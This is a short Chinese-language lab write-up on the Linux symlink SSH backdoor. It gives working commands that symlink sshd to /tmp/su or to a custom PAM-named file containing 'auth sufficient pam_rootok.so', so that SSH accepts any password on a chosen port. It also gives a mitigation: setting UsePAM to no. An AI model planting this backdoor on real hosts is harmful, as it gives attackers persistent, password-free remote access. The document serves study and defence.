### 一、实验过程

### 1、在靶机执行并查看是否软连接建立完成

```shell
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345
netstat -tunlp | grep 12345
```

```shell

```

### 二、防范

#### 1、修改配置文件

```shell
vim /etc/ssh/sshd_config
    UsePAM no
```

![ssh后门4](/images/2018-11-09-Linux软连接后门-2018/ssh12.png)

#### 2、重载ssh配置文件

```shell
/etc/init.d/sshd reload
```

![ssh后门5](/images/2018-11-09-Linux软连接后门-2018/ssh13.png)

#### 3、验证，使用任意密码无法登陆，使用正确密码可以登录

### 三、延伸

```shell
此类ssh后门的核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能,默认的配置文件中出来su，是否还有其他的可利用的配置文件
```

```shell
靶机：
echo "auth sufficient pam_rootok.so" >> /etc/pam.d/hacker
cat /etc/pam.d/hacker
ln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=2333
netstat  -tunlp | grep 2333
```

### 四、小结

#### `1、Linux软连接ssh后门需要ssh配置允许PAM认证才能使用`

#### `2、如果被控主机不允许root登陆可用其他已存在用户登陆`

#### `3、通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在/etc/pam.d/目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)`

#### `4、任意密码登陆的核心是auth sufficient pam_rootok.so,只要PAM配置文件中包含此配置即可 SSH任意密码登陆`
